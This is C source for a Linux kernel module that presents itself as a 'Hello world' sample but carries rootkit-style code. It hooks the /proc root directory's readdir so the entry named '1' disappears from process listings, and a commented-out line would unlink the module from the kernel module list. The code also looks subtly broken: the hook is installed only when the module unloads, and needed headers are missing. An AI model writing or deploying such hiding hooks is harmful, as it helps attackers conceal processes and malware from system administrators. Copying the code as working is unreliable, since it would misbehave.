#include <linux/module.h>
#include <linux/kernel.h>

static struct proc_dir_entry *root;
static struct file_operations *fops;
static struct file_operations *root_fops;
static int (*old_proc_readdir)(struct file *, void *, filldir_t);
static filldir_t old_filldir;

static int new_filldir(void *__buf, const char *name, int namelen,
	loff_t offset, u64 ino, unsigned d_type) {
    if (!strcmp(name, "1"))
	return 0;
    return old_filldir(__buf, name, namelen, offset, ino, d_type);
}

static int new_proc_readdir(struct file *filp, void *dirent,
	filldir_t filldir) {
    old_filldir = filldir;
    return old_proc_readdir(filp, dirent, new_filldir) ;
}

static inline void change_proc_root_readdir(void)
{
    root_fops = (struct file_operations *)root->proc_fops;
    old_proc_readdir = root_fops->readdir;
    root_fops->readdir = new_proc_readdir;
}

static void proc_init(void) {
    root = create_proc_entry("temporary", 0444, NULL);
    root = root->parent;
    remove_proc_entry("temporary", NULL);
    change_proc_root_readdir();
}

int init_module(void) {
    printk(KERN_INFO "Hello world !\n");
    //list_del_init(&__this_module.list);

    return 0;
}

void cleanup_module(void) {
    proc_init();
    printk(KERN_INFO "Goodbye world !\n");
}
